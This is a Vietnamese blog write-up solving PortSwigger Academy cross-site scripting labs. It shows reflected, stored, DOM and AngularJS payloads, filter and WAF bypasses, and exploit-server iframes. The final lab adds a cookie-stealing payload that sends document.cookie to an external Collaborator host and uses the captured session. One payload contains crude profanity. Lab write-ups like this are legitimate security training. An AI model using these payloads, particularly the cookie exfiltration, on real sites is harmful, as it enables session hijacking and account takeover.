---
title: "[PortSwigger Lab] - Cross Site Script"
description: Solution of XSS on PortSwigger Lab
date: 2025-05-25 22:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, xss, cross site script]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-05-25-portswigger-cross-site-script/xss.png
    alt: Cross Site Script
---

## Introduction
---

### Cross-Site Scripting (XSS)
`Cross-Site Scripting (XSS)` là một lỗ hổng bảo mật phổ biến trong các ứng dụng web, cho phép kẻ tấn công chèn mã độc (thường là `JavaScript`) vào trang web được người dùng khác truy cập. Khi nạn nhân truy cập trang web bị chèn mã, đoạn mã độc sẽ được trình duyệt thực thi thay cho người dùng, từ đó kẻ tấn công có thể:
- Đánh cắp `cookie`, `session token`
- Thực hiện hành vi thay người dùng (ví dụ gửi yêu cầu giả danh người dùng)
- Hiển thị nội dung giả mạo
- Lừa người dùng nhập thông tin cá nhân

### Type of XSS
1. Stored XSS (XSS lưu trữ): 
- Mã độc được lưu vào cơ sở dữ liệu, bình luận, bài viết... và được hiển thị lại cho các người dùng khác.
- Ví dụ: người dùng chèn script vào phần bình luận → các người dùng khác vào xem sẽ bị dính mã độc.

2. Reflected XSS (XSS phản chiếu):
- Mã độc nằm trong URL hoặc input và được phản hồi ngay trong trang web.

3. DOM-based XSS:
- Mã độc được thực thi bởi chính `JavaScript` phía client do thao tác với DOM mà không kiểm tra kỹ input.

## Solve XSS Labs
[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---

### Lab: Reflected XSS into HTML context with nothing encoded
> Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.

Phòng thí nghiệm này chứa một lỗ hổng `XSS reflected` đơn giản trong chức năng tìm kiếm.

1. Lổ hổng `XSS reflected` xuất hiện ở chức năng `search`, kết quả khi `search`:
```html
0 search results for 'abc'
```

2. Thay thế `abc` bằng `payload`:
```
<img src=0 onerror=alert(1)>
```
- `<img src=0>`: cố gắng tải một ảnh từ đường dẫn "0" → sẽ bị lỗi (image không tồn tại).
- `onerror=alert(1)`: khi lỗi xảy ra (tức là không tải được ảnh), sự kiện `onerror` được kích hoạt và trình duyệt thực thi alert(1).

### Lab: Stored XSS into HTML context with nothing encoded
> Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.

Phòng thí nghiệm này chứa một lỗ hổng `XSS stored` đơn giản trong chức năng tìm kiếm.

1. Lổ hổng `XSS stored` xuất hiện ở chức năng `comment`, sau khi `comment`, `payload` được lưu trữ và hiển thị trên trình duyệt nạn nhân truy cập vào liên kết đó 
Payload:
```
<img src=0 onerror=alert(1)>
```

2. Thêm `payload` trên vào phần comment, điền đầy đủ thông tin và đăng
3. Trở lại bài `post` -> xuất hiện `alert`

### Lab: DOM XSS in **document.write** sink using source **location.search**
> Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.

Phòng thí nghiệm này chứa lỗ hổng XSS dựa trên DOM trong chức năng theo dõi truy vấn tìm kiếm. Nó sử dụng chức năng JavaScript `document.write`, ghi dữ liệu ra trang. Hàm `document.write` được gọi với dữ liệu từ `location.search`, mà bạn có thể kiểm soát bằng URL trang web.

1. Thực hiện `search`, kết quả:
```html
0 search results for 'abc'
```

2. **Inspect**, kiểm tra `<script>`
```html
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>                    
<img src="/resources/images/tracker.gif?searchTerms=abc" gafqlj9w1="">
```
- Đọc giá trị `search` từ `URL`
- Dùng `document.write(...)` để chèn ảnh vào trang với `query`  là từ khóa cần tìm

3. Thêm `payload` để tạo thêm thẻ `<img>`
```
"> <img src=0 onerror=alert(1)>
```

4. Kết quả:
```html
<img src="/resources/images/tracker.gif?searchTerms=" qm024hoew="">
<img src="0" onerror="alert(1)">
">
```

### Lab: DOM XSS in **innerHTML** sink using source **location.search**
- Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.
- Vị trí lỗ hổng: chức năng `search`.

#### Result after `search`:

```html
<h1>
    <span>0 search results for '</span>
    <span id="searchMessage">abc</span>
    <span>'</span>
</h1>

<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
</script>
```

Flow:
- Lấy từ khóa từ thanh `url`
- Ghi từ khóa vào `<span id="searchMessage">Từ khóa</span>`

#### Exploit:
- Thêm payload `<img src=0 onerror=alert(1)>`
- search

### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
- Mục tiêu: Tạo alert `document.cookie` liên kết khi`"back"`.
- Vị trí lỗ hổng: trang `submit feedback`

#### Submit feedback
- Thanh `url` tại `feedback page`:  `https://abc.web-security-academy.net/feedback?returnPath=/`
- Script:
```html
<script>
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>
```
- Thẻ a với id `#backLink` được gán thuộc tính `href` = giá trị của `returnPath` trên thanh `url`

#### Exploit
- Thanh đổi `url` thành `https://abc.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)`
- Thẻ a với id `#backLink`:
```html
<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
```
- **'javascript:'** là một `URI scheme` đặc biệt trong `HTML`, cho phép nhúng mã `JavaScript` vào thuộc tính như `href`.

### Lab: DOM XSS in jQuery selector sink using a hashchange event
- Mục tiêu: Cung cấp một khai thác cho nạn nhân gọi hàm `print()` trong trình duyệt của họ.
- Loại lỗ hổng: `DOM-based XSS`
- Vị trí: chức năng `hashchange`

#### Script 
```html
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```
Flow:
- Khi có **hashchange** `https://abc.web-security-academy.net/#<img src=1 onerror=alert(1)>`
- Ứng dụng sẽ lấy `post` có tên trùng với `hashchange` rồi `scroll view` tới vị trí của `post` đó
- `jQuery` sẽ phân tích `selector` này như `HTML`: 
```html
$('section.blog-list h2:contains(<img src=x onerror=alert(1)>)')
```
- Dẫn đến thực thi mã độc → XSS xảy ra.

#### Exploit
- Đến **Exploit server**
- Thêm vào Body:

```html
<iframe src="https://abc.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

- Để đảm bảo `'<img src=x onerror=print()>'` được thực thi, ta cần thêm nó vào sau khi `load iframe` thông qua sự kiện `onload`.
- Deliver to victim

> Nếu bạn đưa **HTML** vào trong **$('...')** mà không có dấu ngoặc kép, **jQuery** sẽ hiểu đó là một đoạn **HTML**, chứ không phải là **selector** → nó sẽ tạo **DOM** mới từ đoạn đó.
{: .prompt-info}

### Lab: Reflected XSS into attribute with angle brackets HTML-encoded
- Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.
- Loại lỗ hổng: Reflected XSS 
- Vị trí: chức năng `search`

#### From search
```html
<form action="/" method="GET">
    <input type="text" placeholder="Search the blog..." name="search" value="abc">
    <button type="submit" class="button">Search</button>
</form>
```
- Sau khi search `abc` thì `value`=`"abc"`
#### Exploit
- Sử dụng payload: `"onmouseover="alert(1)`
- Form sẽ được thêm `event`

```html
<form action="/" method="GET">
    <input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">
    <button type="submit" class="button">Search</button>
</form>
```
- Khi `hover` vào `input`, `alert(1)` sẽ xuất hiện

### Stored XSS into anchor href attribute with double quotes HTML-encoded
- Mục tiêu: Thực hiện một cuộc tấn công XSS để gọi hàm `alert`.
- Loại lỗ hổng: Stored XSS
- Vị trí: Chức năng `Comment` - Phần `Website`

#### Comment inspect

```html
<section class="comment">
    <p>
        <img src="/resources/images/avatarDefault.svg" class="avatar">                            
        <a id="author" href="http://a.com">a</a> | 26 May 2025
    </p>
    <p>a</p>
    <p></p>
</section>
```

#### Exploit
Payload:
```
javascript:alert(1)
```
- Thêm paylaod này vào phần `Website`
- Submit
- Thẻ `<a>` được thay đổi thành

```html
<a id="author" href="http://a.com">a</a> | 26 May 2025
```
- Khi click vào `a`, XSS xuất hiện.


### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
- Mục tiêu: Thực hiện một tấn công XSS phản xạ `(reflected XSS)` để gọi hàm `alert()` bằng cách thoát khỏi chuỗi `JavaScript` nơi dữ liệu được phản xạ, mặc dù các dấu " đã bị mã hóa.
- Loại lỗ hổng: Reflected XSS
- Vị trí: Chức năng `search`

#### Search inspect
```html
<script>
    var searchTerms = 'abc';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<img src="/resources/images/tracker.gif?searchTerms=abc" c54oj1cyc="">
```

#### Exploit
- Search với payload
```
; alert(1);//
```
- Source code sẽ thay đổi thành
```html
<script>
    var searchTerms = ''; alert(1);//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<img src="/resources/images/tracker.gif?searchTerms=" cv1nsp83o="">
```
- Tách lệnh bằng `;` sau đó hiện thị `alert(1)` và `comment` bằng `//`

```html
<script>
    var searchTerms = ''; alert(1);//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<img src="/resources/images/tracker.gif?searchTerms=" cv1nsp83o="">
```

- Dùng cách ngắn hơn `'-alert(1)-'` hay `'+alert(1)+'`

### Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element
- Mục tiêu: Thực hiện một tấn công XSS để gọi hàm `alert()`
- Loại lỗ hổng: DOM base XSS
- Vị trí: Chức năng `stock checker`

#### Code inspect
```html
<form id="stockCheckForm" action="/product/stock" method="POST">
    <input required="" type="hidden" name="productId" value="1">
    <script>
        var stores = ["London","Paris","Milan"];
        var store = (new URLSearchParams(window.location.search)).get('storeId');
        document.write('<select name="storeId">');
        if(store) {
            document.write('<option selected>'+store+'</option>');
        }
        for(var i=0;i<stores.length;i++) {
            if(stores[i] === store) {
                continue;
            }
            document.write('<option>'+stores[i]+'</option>');
        }
        document.write('</select>');
    </script>
    <select name="storeId">
        <option>London</option>
        <option>Paris</option>
        <option>Milan</option>
    </select>
    <button type="submit" class="button">Check stock</button>
</form>
```

Có thể khai thác từ đây
```html
<script>
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
</script>
```

- Ứng dụng lấy `storeId` từ `url`
- Ghi `storeId` ra `page` nếu có

#### Exploit
- Mặc định chưa có tham số `storeId` trên url
- Cần thêm `storeId` dưới dạng `payload`
```
https://0a8e00370342ad4c80f112380058001f.web-security-academy.net/product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```

- Request
```http
GET /product?productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E HTTP/1.1
Host: 0a8e00370342ad4c80f112380058001f.web-security-academy.net
```

- Script trở thành

```html
<form id="stockCheckForm" action="/product/stock" method="POST">
    ...
    <select name="storeId">
        <option selected="">"&gt;</option>
    </select>
    <img src="1" onerror="alert(1)">
    <option>London</option>
    <option>Paris</option>
    <option>Milan</option>
    <button type="submit" class="button">Check stock</button>
</form>
```

### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
- Mục tiêu: Tấn công XSS thực thi biểu thức `AngularJS` và gọi hàm `alert()`
- Lỗ hổng: DOM base XSS trong một biểu thức `AngularJS`
- Vị trí: Trong chức năng tìm kiếm

```html
<h1>0 search results for '123'</h1>
```

- Xem nguồn trang và quan sát rằng chuỗi ngẫu nhiên của bạn được đặt trong một chỉ thị `ng-app`
{% raw %}
- Nhập biểu thức AngularJS sau trong hộp tìm kiếm: `{{$on.constructor('alert(1)')()}}`
- `{{ ... }}` là `AngularJS expression binding`.
{% endraw %}
- `$on` là một phương thức mặc định trong scope của một `controller/component` trong `AngularJS` — nó dùng để đăng ký event listeners.
- `$on.constructor` → trả về Function constructor, vì $on là một function.
- `'alert(1)'` → được truyền vào Function constructor → tạo ra function thực thi alert(1).
- `()` gọi function đó → thực thi XSS (alert(1)).

### Lab: Reflected DOM XSS
- Mục tiêu: Tạo một `inject` gọi hàm `alert()`

**Response from server**
#### /resources/js/searchResults.js
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: public, max-age=3600
X-Frame-Options: SAMEORIGIN
Content-Length: 2728

function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();
    ...
}
```
- Trong `response` trên có hàm nguy hiển `eval()`
- `eval()` nguy hiểm vì nó cho phép thực thi bất kỳ mã JavaScript nào được truyền vào dưới dạng chuỗi, ví dụ:

```js
eval("alert('Hacked!')");
```

#### Response for /search-results?search=\"-alert(1)}//
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 45

{"results":[],"searchTerm":"\\"-alert(1)}//"}
```
- `this.responseText` lúc này là chuỗi `'{"results":[],"searchTerm":"\\"-alert(1)}//"}'`
- khi `eval()` chạy chuỗi JSON này, nó dịch chuỗi escape \" thành ", và sẽ hiểu đoạn mã là:

```js
var searchResultsObj = {
  results: [],
  searchTerm: ""-alert(1)}//"
};
```

### Lab: Stored DOM XSS
- Mục tiêu: Tấn công XSS gọi hàm `alert()`
- Loại: Stored DOM XSS
- Vị trí: Chức năng `comment`

#### Check page source
Request
```http
GET /resources/js/loadCommentsWithVulnerableEscapeHtml.js HTTP/2
Host: 0a00002e0440efff8030f885004400e6.web-security-academy.net
Cookie: session=dRrYTwa5lH6UkqG4udIYmGBoabCTSuJK
```

Response:
```
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
    ...
}
```

- Hàm `escapeHTML` chỉ `escape` kí tự đầu tiên của mỗi loại
- Nó được sử dụng để  `escape` cho toàn bộ dự liệu
- Chỉ cần thêm `<>` vào đầu payload để nó chỉ escape `<>` và payload

Payload: `comment=<><img src=1 onerror=alert(1)>`

Request:
```http
POST /post/comment HTTP/2
Host: 0a3100e404e5fb188128346700980096.web-security-academy.net
Cookie: session=eZnnJtH53BgIE75YVPjCrAqgQblzFcZR

...

csrf=sBvtxMG9FUqGYVWo63C2JSOOSDV9b5qx&postId=9&comment=%3C%3E%3Cimg+src%3D1+onerror%3Dalert%281%29%3E&name=a&email=a%40gmail.com&website=http%3A%2F%2Fa.com
```

### Lab: Reflected XSS into HTML context with most tags and attributes blocked
- Mục tiêu: Thực hiện một cuộc tấn công `XSS` bỏ qua `WAF` và gọi hàm `print()`.
- Loại `Reflect XSS`
- Vị trí: Chức năng tìm kiếm

#### Analyst
Một số tag và atribute đã bị `WAF`, xảy ra 2 trường hợp:
- "Tag is not allowed"
- "Tag is not allowed"

#### Exploit
- Sử dụng **Burp Intruder** dể tự động hóa, kiểm tra các `tag, attribute` nào được phép sử dụng.
- Sử dụng payload sau khi tìm được: `<body onresize=print()>`
- Trong 1 page chỉ có được 1 thẻ body, khi ta thêm 1 thẻ nữa, nó sẽ chỉ thêm `attribute` vào body hiện có
- Đến `Exploit Server` 
- Thêm payload vào phần body

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=<body+onresize%3dprint()>" onload=this.style.width='100px'>
```

- Deliver to victim
- Kích hoạt sự kiện resize sau khi load `iframe` kéo theo sự kiện `onresize` làm cho `print()` được gọi

### Lab: Reflected XSS into HTML context with all tags blocked except custom ones
- Mục tiêu: Thực hiện một cuộc tấn công `XSS` bỏ qua `WAF` và gọi hàm `print()`.
- Loại `Reflect XSS`
- Vị trí: Chức năng tìm kiếm

Lab này yêu cầu tạo ra tag mới để thực thi `XSS` do tất cả các tag đã bị `block`

Payload:
```text
<xnxx onfocus=alert() tabindex=1>F*CK ME</xnxx>
```
- Thêm `payload` và `search`

Code inspect:
```html
<h1>0 search results for '
    <xnxx onfocus="alert()" tabindex="1">F*CK ME</xnxx>'
</h1>
```

- **tabindex = 1**: dùng để focus vào thẻ `xnxx` khi `tab` lần đầu hoặc `click` vào nó

- Đến `Exploit Server` 
- Thêm payload sau và **Deliver to victim**

```html
<script>
    location = 'https://0a94008a046ae7f88119f220009200b6.web-security-academy.net/?search=%3Cxnxx+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

### Lab: Reflected XSS with some SVG markup allowed
> Dữ kiện đề cho tag `<svg>` không bị block, việc còn lại là tìm attribute và các tag khác có thể sử dụng được.

> Nếu muốn xác nhận, dùng **Burp Intruder** để  tự động hóa.

Request:
```http
GET /?search=<$tag$> HTTP/1.1
Host: 0a3b0094044a3900810c206f00a700ea.h1-web-security-academy.net
```

- Add ở phần `tag`
- Truy cập [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), copy các `tags` và click `paste`
- Check `length`, xem các request trả về có độ dài lớn là các `tags` có thể sử dụng được
- Ta tìm được thêm tag `animatetransform` là 1 tag nằm trong thẻ `<svg>`
- Tiếp tục tìm các `attribute` 
Request:
```http
GET /?search=<svg><animatetransform $attr$=1></svg> HTTP/1.1
Host: 0a3b0094044a3900810c206f00a700ea.h1-web-security-academy.net
```

- Tương tự các bước ở trên, copy `events` và cheat sheet và dán vào payload
- Ở đây ta tìm thấy được thuộc tính `onbegin`
- `onbegin` là thuộc tính nằm trong các thẻ `animate` dùng để kích hoạt sự kiện khi bắt đầu `animate`

Payload:
```
<svg><animatetransform onbegin=alert(1)></svg>
```
- Tìm kiếm dựa trên payload này.

### Lab: Reflected XSS in canonical link tag
Inspect page:
```html
<link rel="canonical" href="https://0a9700ee0424b8098096d53e00260014.web-security-academy.net/">
```
- `rel="canonical"`  
    - Đây là thẻ chuẩn hóa URL (SEO).
    - Google dùng để biết đâu là phiên bản chính của một nội dung khi có nhiều URL trùng lặp.
- `href` được lấy từ thanh url, nơi payload có thể hoạt động
Payload:
```
https://0a0800bb047cb2448092e45700620097.web-security-academy.net/?'accesskey='x'onclick='alert(1)
```

Result:
```html
<link rel="canonical" href="https://0a0800bb047cb2448092e45700620097.web-security-academy.net/?" accesskey="x" onclick="alert(1)">
```
- `accesskey` kích hoạt attribute `onclick` khi nhấn các tổ hợp phím
    - **On Windows:** ALT+SHIFT+X
    - **On MacOS:** CTRL+ALT+X
    - **On Linux:** Alt+X

### Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
Inspect code:
```html
<script>
    var searchTerms = 'abc';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<img src="/resources/images/tracker.gif?searchTerms=abc" ntouotzal="">
```

- `', \` đã bị escaped
- Không thể sử dụng `"` để đóng `src` của **img** được vì đã bị **encodeURIComponent**
- Ý tưởng: 
    - Đóng thẻ script lại để thoát khỏi nó
    - Tạo ra thẻ mới thực thi được `alert()`

Payload:
```
</script><img src=1 onerror=alert(1)><script>
```

Inspect:
```html
<script> var searchTerms = '</script>
<img src="1" onerror="alert(1)">
<script>';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
- **HTML encoded**: 
    - `<` và `>` thành `&lt;` và `&gt;`
    - `"` thành `&quot;`
- **Encapsed**: Tức thêm `\` đăng trước kí tự 
    - `'` thành `\'`

Mặc dù vậy, ký tự `\` chưa được xử lý
```html
<script>
    var searchTerms = '\';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
- Sử dụng nó để biến `'` thành ký tự đặc biệt, không phải chuỗi

- Payload: `\';alert(1)//`
```html
<script>
    var searchTerms = '\\';alert(1)//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
- `\'` biến `'` thành kí tự đóng
- Sau đó ngắn cách lệnh bằng `;` và `alert()` rồi `comment` lệnh đằng sau

### Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
- **HTML encoded**: 
    - `<` và `>` thành `&lt;` và `&gt;`
    - `"` thành `&quot;`
- **Encapsed**: Tức thêm `\` đăng trước kí tự 
    - `'` thành `\'`
    - `\` thành `\\`

#### Testing in Website input
Payload:
```
http://abc?'-alert()-'
```

Inspect:
```html
<a id="author" href="http://foo?\'-alert(1)-\'" onclick="var tracker={track(){}};tracker.track('http://foo?\'-alert(1)-\'');">a</a>
```
- `'` đã bị `server` escape 
- Ý tưởng: Tấn công vào phần `javascript` khi `onclick` được kích hoạt
- Sử dụng ký hiệu khác để `browser` có thể hiểu nó là `'`

#### Exploit
Payload:
```
http://abc?&apos;-alert()-&apos;
```

- Bỏ qua được filter của **server** với việc sử dụng `&apos;`
- `&apos;` vì vậy **server** xử lý xong và trả về cho **browser** render ra
- Mà **browser** lại hiểu được `&apos;` là `'`, nên render ra thành
```html
<a id="author" href="http://foo?\'-alert(1)-\'" onclick="var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');">a</a>
```
- `&apos;` là viết tắt entity HTML/XML đại diện cho dấu `'`
- Ngoài ra còn có thể sử dụng `&#39;` cùng là `'`

### Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

| Ký tự         | Ký hiệu | Tên tiếng Việt       | Unicode escaped |
|---------------|---------|----------------------|-----------------|
| Angle bracket | `<`     | Dấu ngoặc nhọn trái  | `\u003C`        |
| Angle bracket | `>`     | Dấu ngoặc nhọn phải  | `\u003E`        |
| Single quote  | `'`     | Dấu nháy đơn         | `\u0027`        |
| Double quote  | `"`     | Dấu nháy kép         | `\u0022`        |
| Backslash     | `\`     | Dấu gạch chéo ngược  | `\u005C`        |
| Backtick      | `` ` `` | Dấu nháy ngược       | `\u0060`        |

#### Testing with some symbol
Inspect:
```html
<h1 id="searchMessage">0 search results for ''\`"<>'</h1>
<script>
    var message = `0 search results for '\u0027\u005c\u0060\u0022\u003c\u003e'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```
Tất cả đều bị **unicode escaped** khi tìm `'\`"<>`

#### Exploit
Payload:
```
${alert(1)}
```

Inspect:
```html
<section class="blog-header">
    <h1 id="searchMessage">0 search results for 'undefined'</h1>
    <script>
        var message = `0 search results for '${alert(1)}'`;
        document.getElementById('searchMessage').innerText = message;
    </script>
</section>
```

- Trong **JavaScript**, bất cứ biểu thức nào bên trong dấu `${...}` trong **template literal** sẽ được thực thi
- `` `string text ${expression} string text` `` là một **template literal**

### Exploiting cross-site scripting to steal cookies
#### Check if XSS can be excuted
- Bình luận với comment sau:
```
<img src=1 onerror=alert(1)>
```
- Kiểm tra và thấy có thể thưc thi được XSS

#### Exploit
- Có thể lấy cookie thông qua việc gửi request ra bên ngoài
- Ta sử dụng **Burp Colloborator** làm server nhận request đến
- Có thể sử dụng **webhook** cho các trường hợp này, nhưng đối với lab của **PortSwigger**, để ngăn chặn nền tảng học viện được sử dụng để tấn công các bên thứ ba, firewall của họ đã chặn các tương tác giữa các phòng thí nghiệm và các hệ thống bên ngoài tùy ý.
- Thêm sửa lại request thông qua repeater ở phần comment
```html
<img src=1 onerror="var cookie=document.cookie; fetch(`https://1877dlq2gnq6usllkj9gm1a9q0wrkk89.oastify.com/${cookie}`)">
```

- Request:

```http
POST /post/comment HTTP/2
Host: 0a5b00ec03013c68803335f000c800fa.web-security-academy.net
Cookie: session=2wyC26CpNb2pdgu9qlaSHx0l9cv0djTT

...

csrf=wxQyr53SHLiE20Y8PEYKxoJG4M3L0Ciy&postId=2&comment=<img+src=1+onerror="var+cookie=document.cookie;fetch(`https://1877dlq2gnq6usllkj9gm1a9q0wrkk89.oastify.com/${cookie}`)">&name=a&email=a%40gmail.com&website=http%3A%2F%2Fa.com
```

- Pool now trong **Burp Colloborator** để lấy request

Receive:
```http
GET /secret=REHTIKjULCK5QSUjpVXpxA6IaBVhb1Gm;%20session=N7u8fdIdaT29iSlUmAlZSmuHswhAsZX0 HTTP/1.1
Host: 1877dlq2gnq6usllkj9gm1a9q0wrkk89.oastify.com
```
- Dùng **Cookie Editor extension**, import cookie vừa lấy được

---
Goodluck! 🍀🍀🍀
